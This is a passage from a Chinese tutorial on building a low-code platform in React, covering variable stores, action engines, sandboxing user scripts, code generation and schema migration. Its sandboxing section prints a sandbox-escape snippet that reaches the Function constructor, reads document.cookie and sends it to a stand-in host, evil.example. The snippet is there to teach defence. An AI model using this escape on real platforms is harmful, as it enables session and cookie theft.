                      {/* 动作配置表单：又是"schema 渲染表单"的自举 */}
                      <SetterForm
                        schema={def.configSchema}
                        value={action.config}
                        onChange={(config) => {
                          const actionList = [...binding.actions];
                          actionList[i] = { ...action, config };
                          setBinding(event, { ...binding, actions: actionList });
                        }}
                      />
                    </li>
                  );
                })}
              </ol>
            )}
          </section>
        );
      })}
    </div>
  );
}
```

**怎么做（三）ExpressionSetter**。它的本质是"带校验与预览的受限代码输入框"：变量插入按钮把作用域树（`$page` / `$global` / `$ds` / `$event`）里的变量名插进光标处；输入防抖后用底座 1.4 求值器的 `parse` 做语法校验（只解析不求值，不会执行副作用）；预览区用当前变量池的值真实求值一次，让用户立刻看到结果。

```tsx
// setters/ExpressionSetter.tsx
import { useMemo, useState } from 'react';
import { parse, evaluate } from '../expr'; // 底座 1.4 的 mini 求值器：parse 只做词法+语法，evaluate 求值
import { useRuntimeStore } from '../runtime/store';

export function ExpressionSetter({
  value, onChange,
}: {
  value: string;
  onChange: (next: string) => void;
}) {
  const [text, setText] = useState(value);
  const context = useRuntimeStore((s) => s.exprContext); // { $page, $global, $ds, $event } 当前值

  const { error, preview } = useMemo(() => {
    if (!text.trim()) return { error: null, preview: undefined };
    try {
      const ast = parse(text);            // 语法错误在这里抛出（括号不配对、点号悬空……）
      return { error: null, preview: evaluate(ast, context) }; // 用真实变量池预览结果
    } catch (e) {
      return { error: (e as Error).message, preview: undefined };
    }
  }, [text, context]);

  return (
    <div>
      <input
        value={text}
        onChange={(e) => { setText(e.target.value); onChange(e.target.value); }}
        placeholder="例如 $page.keyword"
        style={{ borderColor: error ? 'red' : undefined }}
      />
      <div>
        <button onClick={() => { setText(`${text}$page.`); }}>$page.</button>
        <button onClick={() => { setText(`${text}$global.`); }}>$global.</button>
      </div>
      {error && <p style={{ color: 'red' }}>{error}</p>}
      {!error && text && <p>预览：{JSON.stringify(preview)}</p>}
    </div>
  );
}
```

**常见坑（症状→根因→修法）**：症状——用户把 `{{ }}` 双花括号写进表达式（Vue/amis 习惯），预览直接报错。根因——平台表达式语法是"裸表达式"（`$page.x`），与用户记忆里的模板语法冲突。修法——`parse` 前做一次宽容清洗：剥掉首尾 `{{ }}` 再解析（amis 的 `${}`、Vue 的 `{{}}` 都容忍这种写法），或在文档化校验失败信息里直接提示"不需要花括号"。

#### 路线 5：变量系统——页面级/全局级变量池与 bindings 求值

**是什么**：变量池是页面的运行时状态仓库，分两级——页面级（`$page`，每个页面一份，随 schema 声明 `pageVariables`）与全局级（`$global`，整个应用一份：登录用户、主题、租户信息，由宿主应用注入）。节点的 `bindings` 声明"哪个 prop 的值来自哪个表达式"，渲染时对表达式求值注入 props。

**为什么需要**：没有变量系统，跨组件联动只能靠事件动作硬连（"输入框 onChange 时调接口"里接口结果怎么给到卡片列表？）。变量池把"数据"从"交互"里抽出来：组件只声明"我读 `$ds['ds-users'].data`"，谁来写、何时写它一概不知——这样新增一个写入方（定时刷新、协同推送）不需要改任何读方。同时它给了 bindings 一个统一的求值上下文（第 1 章表达式引擎的 `$form` 思想放大到页面级）。

**怎么做（一）变量池 store**。

```ts
// runtime/variableStore.ts
import { create } from 'zustand';

interface VariableState {
  page: Record<string, unknown>;    // $page.*
  global: Record<string, unknown>;  // $global.*（由宿主应用初始化时灌入）
  ds: Record<string, { loading: boolean; data: unknown; error?: string }>; // $ds['id'].* 数据源状态
  write: (scope: 'page' | 'global', name: string, value: unknown) => void;
  setDs: (id: string, patch: Partial<VariableState['ds'][string]>) => void;
}

export const useRuntimeStore = create<VariableState>((set) => ({
  page: {},
  global: {},
  ds: {},
  write: (scope, name, value) =>
    set((s) => ({ [scope]: { ...s[scope], [name]: value } }) as Partial<VariableState>),
  setDs: (id, patch) =>
    set((s) => ({ ds: { ...s.ds, [id]: { ...s.ds[id], loading: false, data: undefined, ...patch } } })),
}));
```

页面挂载时按 `pageVariables` 的声明初始化 `page`（保证表达式求值时字段存在，哪怕是 `null`——这直接规避了第 2 章"undefined 初始值三态"的老坑）。

**怎么做（二）bindings 的求值时机**。这是变量系统的核心设计题，逐个场景分析：

1. **首渲染**：渲染器递归到节点时，对该节点全部 `bindings` 求值一次，结果与 `props` 合并（bindings 覆盖同名静态 props）。
2. **变量变化时**：谁重算？两种策略——*拉模型*（粗暴）：组件订阅整个变量池，任何变量变化都重求值；*推模型*（精准）：解析每个表达式引用了哪些变量（AST 里收集 `$page.foo` 形态的成员访问），组件只订阅自己表达式引用到的变量。小页面用拉模型足够（配合节点 memo，第 1 章 1.7），节点上千或表达式密集时推模型是性能的分水岭——这正是第 2 章"path 级订阅"思想在页面级的重演。
3. **事件执行时**：动作里的 `valueExpr`/`paramsExpr` 在**动作执行的那一刻**求值，绝不缓存——两次 `updateVariable` 之间变量可能已被前一个动作改过。
4. **dataSource 请求发出时**：`paramsExpr` 在每次请求前求值（轮询每轮重求），保证参数永远新鲜。

推模型的实现骨架：

```tsx
// runtime/useBoundProps.ts
import { useMemo } from 'react';
import { useShallow } from 'zustand/react/shallow';
import { parse, evaluate, collectDeps } from '../expr'; // collectDeps：遍历 AST 收集变量 token
import { useRuntimeStore } from './variableStore';
import type { SchemaNode } from '../schema/types';

export function useBoundProps(node: SchemaNode): Record<string, unknown> {
  const exprs = node.bindings ?? {};
  // 依赖是表达式的静态属性：解析一次，随 bindings 缓存
  const deps = useMemo(
    () => collectDeps(Object.values(exprs).map(parse)),
    [exprs],
  );
  // 只订阅依赖到的变量切片（zustand selector + useShallow 浅比较）
  const slice = useRuntimeStore(useShallow((s) => {
    const picked: Record<string, unknown> = {};
    for (const d of deps) picked[d] = resolveToken(s, d); // '$page.keyword' → s.page.keyword
    return picked;
  }));
  return useMemo(() => {
    const ctx = { $page: ..., $global: ..., $ds: ... }; // 由 slice 重建求值上下文
    return Object.fromEntries(Object.entries(exprs).map(([k, src]) => [k, evaluate(parse(src), ctx)]));
  }, [exprs, slice]);
}
```

渲染器里每个节点组件 `const bound = useBoundProps(node)`，然后 `<Widget {...node.props} {...bound} />`。

**常见坑（症状→根因→修法）**：症状——页面一打开，绑定 `'$ds["ds-users"].data'` 的卡片列表闪一下"空数据"再出内容。根因——bindings 求值发生在数据源请求 resolve 之前，`undefined` 被当成"空列表"渲染了。修法——数据源状态机必须含 `loading`，绑定时写 `'$ds["ds-users"].loading ? $ds["ds-users"].data ?? [] : "加载中"'`（表达式引擎支持三元与 `??`），物料侧对 `items === undefined` 渲染骨架屏而不是空态文案——"没数据"和"还没加载完"是两个语义。

#### 路线 6：动作引擎——action registry 与串行动作链

**是什么**：动作引擎是 `events` 的运行时。事件发生（用户点击 / 接口成功 / 变量变化）→ 引擎找到该节点该事件的绑定 → 按数组顺序逐个执行动作，前一个 `await` 完成才执行下一个 → 其中"触发别的事件"类动作（`emitEvent`、写变量触发的监听）会递归进入引擎，深度 +1。

**为什么需要**："动作链"给了配置人员顺序语义（先校验后提交），`await` 串行给了异步正确的默认行为（不写回调就能等接口返回再弹窗）。而"深度计数"是引擎的自我保护：协议允许 `emitEvent` 让 A 的事件动作去触发 B、B 再触发 A——表达能力换来了循环的可能，引擎必须有熔断。

**怎么做（一）执行上下文与引擎**。

```ts
// engine/context.ts —— 每次事件分发创建一个上下文，动作只能用它拿能力（最小权限）
export interface ActionContext {
  depth: number;                                  // 当前链深，emitEvent 时 +1
  evaluate: (expr: string) => unknown;            // 表达式求值（读变量池，路线 5）
  variables: {
    read: (scope: 'page' | 'global', name: string) => unknown;
    write: (scope: 'page' | 'global', name: string, value: unknown) => void;
  };
  apis: {
    call: (apiId: string, params?: unknown) => Promise<unknown>; // 唯一的接口出口，可统一加鉴权/埋点
  };
  ui: {
    openModal: (modalId: string) => Promise<void>;
    toast: (msg: string) => void;
    navigate: (url: string) => void;
  };
  emit: (nodeId: string, event: string, payload?: unknown) => Promise<void>; // 触发其他节点事件 → 走引擎
  log: (msg: string) => void;
}
```

```ts
// engine/dispatcher.ts
import { getAction } from './actionRegistry';
import type { ActionContext } from './context';
import type { PageSchema, SchemaNode } from '../schema/types';

export const MAX_ACTION_DEPTH = 32; // 熔断阈值：正常业务链 3~5 层封顶，32 只可能是环

function findNode(nodes: SchemaNode[], id: string): SchemaNode | undefined {
  for (const n of nodes) {
    if (n.id === id) return n;
    if (n.children) { const hit = findNode(n.children, id); if (hit) return hit; }
  }
  return undefined;
}

export class CycleGuardError extends Error {}

// 事件分发入口。depth 由调用方传入：用户交互触发为 0，emitEvent/变量监听触发为 parent+1
export async function dispatchEvent(
  schema: PageSchema,
  nodeId: string,
  eventName: string,
  payload: unknown,
  depth: number,
  makeContext: (depth: number, payload: unknown) => ActionContext,
): Promise<void> {
  if (depth > MAX_ACTION_DEPTH) {
    // 熔断：抛出带定位信息的错误，编辑器与运行时都能把这条链路画给用户看
    throw new CycleGuardError(
      `事件链超过最大深度 ${MAX_ACTION_DEPTH}，疑似循环触发：最近节点 ${nodeId} 事件 ${eventName}`,
    );
  }
  const node = findNode(schema.nodes, nodeId);
  const binding = node?.events?.find((e) => e.event === eventName);
  if (!binding) return; // 没绑定该事件：合法且常见，直接返回

  const ctx = makeContext(depth, payload);
  for (const action of binding.actions) {          // 串行动作链：前一个 await 完成（或抛错）才轮到下一个
    const def = getAction(action.type);
    if (!def) {
      ctx.log(`未知动作类型：${action.type}，已跳过`); // 协议演进期常见：旧页面引用已下线动作
      continue;
    }
    await def.execute(action.config, ctx);          // 抛错即中断整条链（callApi 失败要不要继续可升级为配置项）
  }
}
```

`emit` 的实现就是 `dispatchEvent(schema, nodeId, event, payload, ctx.depth + 1, makeContext)`——**深度在递归入口处 +1**，这是整个防死循环机制的关键一行：无论环从哪里进入（emitEvent 直连、写变量触发监听、接口回调再 emit），每层递归都让 depth 增加，环迟早越过阈值。

**怎么做（二）死循环的完整复现**。给出一动手写就会中的 schema——A 节点点击触发 B 的 `ping`，B 的 `ping` 触发 A 的 `pong`，A 的 `pong` 又触发 B 的 `ping`：

```json
{
  "nodes": [
    {
      "id": "btn",
      "type": "button",
      "props": { "text": "开始" },
      "events": [
        { "event": "onClick", "actions": [
          { "type": "emitEvent", "config": { "nodeId": "card", "event": "ping" } } ] },
        { "event": "pong", "actions": [
          { "type": "emitEvent", "config": { "nodeId": "card", "event": "ping" } } ] }
      ]
    },
    {
      "id": "card",
      "type": "card",
      "events": [
        { "event": "ping", "actions": [
          { "type": "emitEvent", "config": { "nodeId": "btn", "event": "pong" } } ] }
      ]
    }
  ]
}
```

用户点一下"开始"，链条是 `onClick → card.ping → btn.pong → card.ping → btn.pong → …` 无限循环。浏览器里会发生什么取决于引擎的异步形态：

- **同步递归形态**（`emit` 不经 `await` 直接调函数）：调用栈每层压入 `dispatchEvent` + `execute` 两个帧，几千层后抛 `RangeError: Maximum call stack size exceeded`——症状是"点一下立刻报错"，好诊断但难看。
- **微任务循环形态**（本文实现：`emitEvent` 的 execute 是 async，`await` 之间让出主线程）：调用栈不增长，但微任务队列永远排不空——**渲染帧永远轮不到执行**。症状是页面永久冻结（不报错、不崩溃、点什么都不响应），任务管理器里该标签页 CPU 占满、内存缓慢上涨；若环里有 `callApi`，还会看到 Network 面板里同一请求刷屏，直到浏览器/网关限流。这种"无声冻结"比栈溢出恶劣得多——用户只能关标签页。

`MAX_ACTION_DEPTH` 熔断对两种形态都生效：第 33 层入口抛出 `CycleGuardError`，外层（渲染器的事件入口）catch 后 toast 提示 + console 打印链路，页面毫秒级恢复。

**为什么"建依赖图检测环"更彻底但更贵**：理论上可以在**保存时**静态建图——节点为 `node.event`，动作为边（`btn.onClick → card.ping` 这条边由 `emitEvent` 配置静态可知），拓扑检测环，环存在就禁止保存并高亮"btn ↔ card 互触"。它的优点是**事前**（保存时）发现、能指出环上所有节点；贵在三点：其一，边的来源不总是静态的——`emitEvent` 的目标可以是表达式（`config.nodeId` 写成 `'$page.targetId'`），`updateVariable` 触发谁的 `onVarChange` 取决于运行时谁订阅了这个变量，`callApi` 的 `successActions` 是否执行取决于响应状态码——静态分析只能覆盖字面量写法，覆盖不了就漏报（漏报比运行时熔断更危险，因为它给人"已检查"的错觉）。其二，每次 schema 编辑都要重算图（或做增量维护），编辑器多一块长期能耗。其三，环不一定是错的——"轮询刷新"类页面可能故意靠变量事件自激（配合间隔节流）。所以工程上的成熟组合是：**运行时深度上限必做（兜底一切动态环），保存时对"字面量可见"的环做 lint 提示（能抓 80% 的手误），两者互补**。这与第 2 章"联动循环依赖→单轮求值或依赖图"是同一个问题在两个协议层的投影。

**常见坑（症状→根因→修法）**：症状——动作链里 `callApi` 后面的 `openModal` 不执行。根因——`callApi` 抛错（4xx/5xx 被封装成 reject），引擎"抛错即中断"把后面的动作全吞了，而用户没有任何感知。修法——引擎在 catch 里 `ctx.log` + toast 失败动作与原因；`callApi` 动作定义里加 `failActions?: ActionConfig[]` 配置，让"失败分支"显式化（amis 的动作体系同样区分成功/失败分支）。

#### 路线 7：安全执行用户自定义 JS（重点）

**是什么**：平台允许配置人员在 `runJs` 动作里写一小段自定义脚本（"把列表按距离排序"这类个性化逻辑）。这段代码由平台**代替用户执行**，因此平台必须保证它拿不到不该拿的东西：宿主应用的登录态、其他页面的数据、任意外部域名请求。本路线回答"怎么执行任意 JS 才安全"。

**为什么需要**：低代码平台的用户脚本与"开发者写的代码"是两个信任等级。开发者代码经过 code review 与发布流程；用户脚本是**运行时提交的字符串**，任何一个账号被钓鱼后，其脚本就等于拿到了该登录态下的一切——如果没有隔离，脚本可以 `fetch('/api/admin/users', { method: 'DELETE' })`。这不是假设：所有面向公众的低代码/SaaS 平台（自动化平台的自定义步骤、表单平台的计算字段）都把这个当一等安全问题。

**怎么做（零）先证明 `new Function` 不安全——逃逸演示**。常见的第一版实现是这样"遮住危险全局"：

```ts
// unsafe/runJs.ts —— 错误示范：变量遮蔽式沙箱
const DANGEROUS = ['window', 'globalThis', 'self', 'document', 'fetch',
  'XMLHttpRequest', 'localStorage', 'sessionStorage', 'eval', 'Function'];

export function runUserJsNaive(code: string): unknown {
  // 用同名参数把危险全局"遮蔽"成 undefined，再包一层严格模式
  const params = DANGEROUS.join(', ');
  const fn = new Function(params, `"use strict"; return (function(){ ${code} })()`);
  return fn(...DANGEROUS.map(() => undefined));
}
```

看似 `fetch`、`document` 都变成了 `undefined`，但下面这段"用户代码"两行就能击穿：

```ts
// 用户提交的代码 —— 逃逸成功
const F = ({}).constructor.constructor;        // Object.prototype.constructor → Function 构造器
const realFetch = F('return fetch')();          // Function 构造器创建的函数在真实全局作用域求值
const cookie = F('return document.cookie')();   // 拿到宿主域名下的 cookie
realFetch('https://evil.example/steal?c=' + encodeURIComponent(String(cookie)));
```

原理要讲透：**词法遮蔽只能挡"名字"，挡不住"引用图"**。JS 里几乎每个对象都通过 `constructor`（追溯到 `Object.prototype`）连着 `Function` 构造器，而 `Function` 构造器永远在**当前领域（realm）的全局作用域**里创建函数——只要用户代码能碰到任何一个内建对象（哪怕 `{}` 字面量），就能重建对全部全局对象的访问。换掉 `Function` 这个名字也没用：`[].map.constructor`、`(()=>{}).constructor`、`Object.getPrototypeOf(async function(){}).constructor` 全部通向它。结论：**隔离必须发生在"领域级别"**——让用户代码运行在一个拥有不同全局对象、不同原型链的环境里，它那里的 `Function` 只能造出"那个世界"的函数。iframe（独立 browsing context）与 QuickJS（独立解释器实例）就是两种领域隔离。

**怎么做（一）iframe sandbox 方案**。核心配置：`<iframe sandbox="allow-scripts">`——**只**给脚本权限，不给 `allow-same-origin`。浏览器会让它运行在一个 opaque origin（不透明源）里：读宿主 cookie、localStorage、父页面 DOM 一律抛 `SecurityError`；它里面的 `Function` 构造器只能访问"它自己那个空空荡荡的全局"。

宿主侧（创建隐藏 iframe、发任务、收结果）：

```tsx
// sandbox/IframeSandbox.tsx
import { useCallback, useEffect, useRef } from 'react';

interface RunResult { id: string; ok: boolean; result?: unknown; error?: string }

export function IframeSandbox() {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const pending = useRef(new Map<string, (r: RunResult) => void>());

  useEffect(() => {
    const onMessage = (e: MessageEvent) => {
      // opaque origin 下 e.origin 是 'null'，唯一可靠校验是窗口引用比对
      if (e.source !== iframeRef.current?.contentWindow) return;
      const msg = e.data as RunResult;
      pending.current.get(msg.id)?.(msg);
      pending.current.delete(msg.id);
    };
    window.addEventListener('message', onMessage);
    return () => window.removeEventListener('message', onMessage);
  }, []);

  const run = useCallback((code: string, timeoutMs = 2000): Promise<RunResult> => {
    const id = crypto.randomUUID();
    return new Promise((resolve, reject) => {
      const timer = setTimeout(
        () => reject(new Error('脚本执行超时')), // 注意：超时只能“放弃等待”，见正文“同线程陷阱”
        timeoutMs,
      );
      pending.current.set(id, (msg) => { clearTimeout(timer); resolve(msg); });
      iframeRef.current?.contentWindow?.postMessage({ id, code }, '*');
    });
  }, []);

  return (
    <iframe
      ref={iframeRef}
      src="/js-sandbox.html"
      sandbox="allow-scripts"          // 关键：没有 allow-same-origin → opaque origin
      style={{ display: 'none' }}
      title="js-sandbox"
    />
  );
}
```

沙箱页 `/js-sandbox.html`（静态资源，不依赖任何业务代码）：

```text
<!doctype html>
<html>
<body>
<script>
  // 本页运行于 sandbox="allow-scripts"（无 allow-same-origin）：
  // - opaque origin：读父页面 DOM / cookie / localStorage 抛 SecurityError
  // - 全局对象干净：这里的 Function 构造器只能看到“这个空世界”
  window.addEventListener('message', function (e) {
    var msg = e.data || {};
    if (typeof msg.id !== 'string' || typeof msg.code !== 'string') return;
    function reply(payload) {
      try { e.source.postMessage(Object.assign({ id: msg.id }, payload), e.origin); }
      catch (err) { /* 结果不可结构化克隆时兜底成字符串 */ 
        e.source.postMessage({ id: msg.id, ok: true, result: String(payload.result) }, e.origin); }
    }
    try {
      var fn = new Function('"use strict"; return (async function(){' + msg.code + '})()');
      Promise.resolve(fn()).then(
        function (r) { reply({ ok: true, result: r }); },
        function (err) { reply({ ok: false, error: String(err) }); }
      );
    } catch (err) {
      reply({ ok: false, error: String(err) });
    }
  });
</script>
</body>
</html>
```

**同线程陷阱（本方案最大短板）**：sandbox 隔离的是**权限**，不是**计算**。iframe 与宿主通常共享同一个事件循环线程——用户脚本写个 `while(true){}`，整个编辑器跟着冻结，`setTimeout` 的超时回调也永远没机会执行（线程被占死了），唯一的恢复手段是用户手动刷新页面。缓解办法：脚本执行改成"每次任务销毁重建 iframe"（防状态累积），再叠加**静态检查**——用 acorn/esprima 把代码 parse 成 AST，白名单放行节点类型（禁止 `WhileStatement`/`ForStatement`？会误伤正常循环，业界一般只做危险成员访问黑名单如 `document.cookie`、`top`、`parent`）。静态检查是减少恶意/事故的过滤器，**不能当唯一的墙**（AST 可被多种写法绕过，如 `obj['cook'+'ie']`）。

**怎么做（二）quickjs-emscripten 方案**。QuickJS 是一个轻量 JS 引擎，quickjs-emscripten 把它编译成 WASM：用户代码在一个与浏览器完全无关的解释器实例里跑——那里没有 DOM、没有 fetch、没有 cookie，全局对象是引擎新建的空白全局，你注入什么它才有什么。领域隔离做到了极致，且天然支持资源限额与硬终止。

```ts
// sandbox/quickjs.ts
import { getQuickJS } from 'quickjs-emscripten';

export interface QjsResult { ok: boolean; result?: unknown; error?: string }

let quickjsPromise: Promise<Awaited<ReturnType<typeof getQuickJS>>> | null = null;
// wasm 体积不小（数百 KB 级），按需懒加载；具体 API 名以所装版本 README 为准
function ensureEngine() {
  quickjsPromise ??= getQuickJS();
  return quickjsPromise;
}

export async function runInQuickJS(code: string, timeoutMs = 100): Promise<QjsResult> {
  const QuickJS = await ensureEngine();
  const vm = QuickJS.createVm();
  const startAt = Date.now();
  // 中断钩子：引擎在每段字节码执行间隙轮询，返回 true 即抛 InternalError 中断
  // 这就是“能打断死循环”的关键——iframe 方案做不到这一点
  vm.setInterruptHandler(() => Date.now() - startAt > timeoutMs);
  try {
    const result = vm.evalCode(code);
    if (result.error) {
      // QuickJS 内的异常值也要按句柄 dump 成 JS 值并释放，否则内存泄漏
      const dumped = vm.dump(result.error);
      result.error.dispose();
      return { ok: false, error: String(dumped) };
    }
    const value = vm.dump(result.value);
    result.value.dispose();
    return { ok: true, result: value };
  } finally {
    vm.dispose(); // 每次任务用完即毁：状态零残留，也堵住“上一次执行污染下一次”
  }
}
```

工程化要点两条。第一，**把它放进 Web Worker**：WASM 解释器本身跑在主线程也会占主线程，放进 Worker 后连"解释器内部死循环"都只占 Worker 线程，宿主可随时 `worker.terminate()` 硬杀——这是唯一真正"杀得死"的终止路径（interruptHandler 依赖引擎轮询，遇到引擎级 bug 时是第二道保险）。第二，**桥接 API 全靠显式注入**：想让用户脚本"发请求"，不是给他 `fetch`，而是用 `vm.newFunction` 包一个白名单桥（`vm.getHostContext` 相关注入 API 以官方文档为准），桥内部做参数校验、域名白名单、频率限制——权限模型从"藏起来"变成"按需给"，安全边界清晰可审计。

**怎么做（三）四方案对比与选型**。

| 方案 | 隔离了什么 | 没隔离什么 | 死循环处理 | 通信 | 成本 | 适用面 |
|---|---|---|---|---|---|---|
| `new Function` + 变量遮蔽 | 仅遮名字，可被构造器链逃逸 | 一切 | 直接卡死页面 | 同步调用，最顺手 | 零 | 仅"作者可信"的内部场景（脚本作者是内部开发者，且经过 code review），或作为 AST 白名单检查后的执行器 |
| Web Worker（无沙箱属性，靠无 DOM 环境） | 计算（独立线程）；DOM 天然没有 | 主线程之外的 API（postMessage 任意目标、importScripts 拉外部脚本） | `terminate()` 硬杀成功 | postMessage 异步 | 低 | 纯计算型脚本（排序/汇总/格式化），作者半可信 |
| iframe sandbox（allow-scripts） | DOM/cookie/storage 权限（opaque origin） | 计算资源（同线程） | 检测得到、杀不掉，只能刷新 | postMessage 异步、结果须可结构化克隆 | 低（一个隐藏 iframe） | 脚本需要"类浏览器"环境或要复用现成页面做执行器 |
| quickjs-emscripten（+ Worker） | 一切：独立解释器、空白全局、注入式 API | —（按定义没有更多可泄露） | `setInterruptHandler` 中断 + 内存上限 + Worker terminate 三重保险 | 桥函数注入 / 消息 | wasm 数百 KB 起步 + 每次执行开销 | 多租户 SaaS、开放市场、安全等级最高的场景 |

选型结论可以直接背下来：**信任分层决定技术分层**——脚本作者是自己人（内部开发者、通过 review 的插件）用 Worker 或裸 `new Function`；平台是私有部署、用户是企业内员工，iframe sandbox 够用；平台是公有 SaaS、脚本来自任意租户，上 quickjs-emscripten 并放进 Worker。三者不互斥，大型平台常常"quickjs 跑表达式、iframe 跑整段页面逻辑"并存。

**常见坑（症状→根因→修法）**：症状——沙箱方案上线后，运营反馈"脚本能跑但拿不到想要的数据"。根因——领域隔离是双向的：沙箱里的空白全局**也没有**平台变量池，`$page` 之类上下文不会自然存在。修法——在三个方案里统一加"上下文注入"约定：宿主把变量池的一个**快照**（或带校验的读桥）随任务传入（iframe：postMessage 的 payload；quickjs：任务前 `vm.evalCode` 预置 `var __ctx = {...}`），脚本里用 `__ctx.page.keyword` 读——只注入快照与白名单读方法，不注入任何写通道与函数引用，隔离边界不被扩大。

#### 路线 8：出码 vs 渲染（Schwarma 架构取舍）

**是什么**：schema 变成可运行页面有两条路。**运行时解释**（渲染路线，amis 的路线）：页面加载引擎，引擎读 schema 动态递归渲染——schema 是运行时的数据。**出码**（编译路线）：构建期把 schema 转换成真实 React 源码（`.tsx` 文件），走正常前端构建发布——schema 是构建期的中间产物。

**为什么需要取舍**：两条路线在"平台要解决的问题"上各有死穴。运行时解释的页面永远背着引擎（amis 全量包不小）、调试断点落在引擎深处（栈里全是 renderer 内部帧）；出码的页面每次改动都要走构建流水线，"改个文案等五分钟发布"直接杀死低代码的核心价值。没有全能解，只有按业务定舍。

**怎么做（一）理解 amis 的运行时解释**。amis 的做法：页面 JSON（根节点 `type: 'page'`）交给 amis 的渲染函数，它按 `type` 查渲染器注册表递归渲染；表达式用 `${xxx}` 语法在运行时求值；事件动作（`onEvent`/actions）由引擎的动作系统执行。所有能力（组件、动作、表达式函数）都注册在引擎里，页面 JSON 只是"驱动数据"。这套架构让"存 JSON 即发布"成为可能——低代码平台编辑器的"保存"按钮可以直接生效，预览即所得。代价：引擎必须全量在场（或做复杂的按需加载），渲染路径多一层"schema → 组件树"的解释，调试时调用栈隔着引擎。

**怎么做（二）出码器长什么样**。出码本质是"schema → 代码字符串"的递归打印器，配一层模板工程（package.json、入口文件、构建配置）：

```ts
// codegen/nodeToJsx.ts —— 把节点树打印成 JSX（示意：覆盖类型需按物料协议补全）
import type { SchemaNode } from '../schema/types';

function attrValue(v: unknown): string {
  if (typeof v === 'string') return JSON.stringify(v);
  return `{${JSON.stringify(v)}}`; // 数字/布尔等：字面量
}

export function nodeToJsx(node: SchemaNode, indent = ''): string {
  const styleAttr = node.style ? ` style={${JSON.stringify(node.style)}}` : '';
  const propAttrs = Object.entries(node.props ?? {})
    .map(([k, v]) => ` ${k}=${attrValue(v)}`).join('');
  // bindings 出码成"运行时读变量池"的表达式：变量池实现换成 zustand selector 皆可
  const bindAttrs = Object.entries(node.bindings ?? {})
    .map(([k, expr]) => ` ${k}={readExpr(${JSON.stringify(expr)})}`).join('');
  if (!node.children?.length) {
    return `${indent}<${node.type}${propAttrs}${bindAttrs}${styleAttr} />`;
  }
  const inner = node.children.map((c) => nodeToJsx(c, indent + '  ')).join('\n');
  return `${indent}<${node.type}${propAttrs}${bindAttrs}${styleAttr}>\n${inner}\n${indent}</${node.type}>`;
}

// nodeToJsx(schema.nodes[0], '') 输出形如：
// <grid style={{"display":"flex"}}>
//   <input value={readExpr("$page.keyword")} placeholder="搜索用户" />
// </grid>
```

注意出码并没有消灭表达式引擎——`readExpr` 仍要在运行时求值（除非进一步把表达式也编译成函数，成本陡增）。出码消灭的是"schema → 组件树"的动态解释与引擎全量在场：生成的项目按需 import 物料组件，tree-shaking 生效，断点直接落在生成代码上。

**怎么做（三）架构对比与决策**。

| 维度 | 运行时解释（amis 路线） | 出码（编译成 React 源码） |
|---|---|---|
| 发布链路 | 存 schema 即生效，秒级 | schema → 出码 → prettier → 构建 → 部署，分钟级起步 |
| 运行性能 | 引擎全量在场，解释开销恒定存在 | 按页面裁剪物料，包体小，无解释层 |
| 调试体验 | 栈深、帧都在引擎内部；问题要靠引擎的调试工具（amis 有 debug 面板） | 生成代码即源码，断点/Profiler 直接可用 |
| 引擎升级 | 引擎升级全站页面即时受益（协议兼容前提下） | 已出码页面**不会**随引擎升级，要靠重新生成 + 人工合并 |
| 动态性 | 运行时改 schema 立刻生效（预览、A/B、动态下发） | 一切变更走流水线 |
| 交付形态 | 页面离不开平台运行时 | 可交付源码给甲方二次开发，脱离平台生命周期 |

决策口径：页面**数量多、变更频繁、生命周期归属平台**（营销活动页、内部中后台）→ 运行时解释；页面**数量少、要求极致性能、要交付给客户团队继续演进**（行业软件的定制页、私有化交付的标准页）→ 出码。两者也可串联：平台内孵化用解释，成熟页面"一键出码"固化——出码按钮本身就是把 schema 走一遍 codegen 并发起构建。

**常见坑（症状→根因→修法）**：症状——出码后的项目三天两头编译报错。根因——出码器与物料协议没有同步演进（协议加了新属性，codeGen 的打印器没接住，生成了非法 JSX）。修法——把"出码产物可编译"做成 CI 硬门槛：每次协议/物料变更自动跑全量出码 + `tsc --noEmit` + 构建，出码器与协议在同一个 monorepo 里同版本发布。

#### 路线 9：Schema 版本迁移——version 字段 + migration 链

**是什么**：协议根节点带 `version` 数字；每当前端协议演进（加字段、改结构），就追加一个"从 vN 到 vN+1"的纯函数；渲染器入口把任意历史版本的 schema 逐级升到当前版本再渲染。这串函数就是 migration 链。

**为什么需要**：低代码平台的 schema 存在数据库里、跨年累积。平台升级改了协议（比如路线 1 里 events 从"单动作"改成"动作链"），所有存量 schema 还是旧结构——渲染器如果直接按新协议解释旧 JSON，轻则丢配置、重则抛错白屏（第 9 章速查表的"旧 schema 页面白屏"）。版本迁移把"协议演进"与"数据演进"解耦：代码往前走，数据跟着函数链走。

**怎么做**：迁移函数链的完整实现与一次真实演进示例。

```ts
// schema/migrate.ts
import type { PageSchema } from './types';

type Migration = (schema: any) => any;

const LATEST_VERSION = 3;

// key = 起始版本号，函数负责把它升到下一版
const migrations: Record<number, Migration> = {
  // v1 → v2：events 从“单动作字符串”升级为“动作链数组”
  1: (s) => ({
    ...s,
    version: 2,
    nodes: s.nodes.map(function upgradeEvents(node: any): any {
      const events = node.events?.map((e: any) => ({
        event: e.event,
        actions: e.action ? [{ type: 'openModal', config: { modalId: e.action } }] : [],
      }));
      const next = { ...node, ...(events ? { events } : {}) };
      if (node.children) next.children = node.children.map(upgradeEvents);
      return next;
    }),
  }),
  // v2 → v3：style 的 kebab-case 字符串间距升级为驼峰数字（'margin-top': '10px' → marginTop: 10）
  2: (s) => ({
    ...s,
    version: 3,
    nodes: s.nodes.map(function upgradeStyle(node: any): any {
      let style = node.style;
      if (style && typeof style['margin-top'] === 'string' && style['margin-top'].endsWith('px')) {
        style = { ...style };
        style.marginTop = Number(style['margin-top'].slice(0, -2)); // '10px' → 10
        delete style['margin-top'];
      }
      const next = { ...node, ...(style ? { style } : {}) };
      if (node.children) next.children = node.children.map(upgradeStyle);
      return next;
    }),
  }),
};

export function migrateSchema(input: unknown): PageSchema {
  let s = structuredClone(input);            // 铁律一：绝不原地修改入参（迁移失败时原数据必须完好）
  let v = typeof s.version === 'number' ? s.version : 1;
  while (v < LATEST_VERSION) {
    const step = migrations[v];
    if (!step) throw new Error(`协议版本 ${v} 缺少迁移函数，无法升级到 ${LATEST_VERSION}`);
    s = step(s);
    v = s.version;                            // 每个迁移自己负责写入新版本号，链上不会错位
  }
  return s as PageSchema;
}
```

配套的 v1 存量数据与迁移后的 v3 结果：

```json
{
  "version": 1,
  "state": { "pageVariables": [], "globalVariables": [] },
  "dataSources": [],
  "nodes": [
    {
      "id": "n1", "type": "button",
      "props": { "text": "提交" },
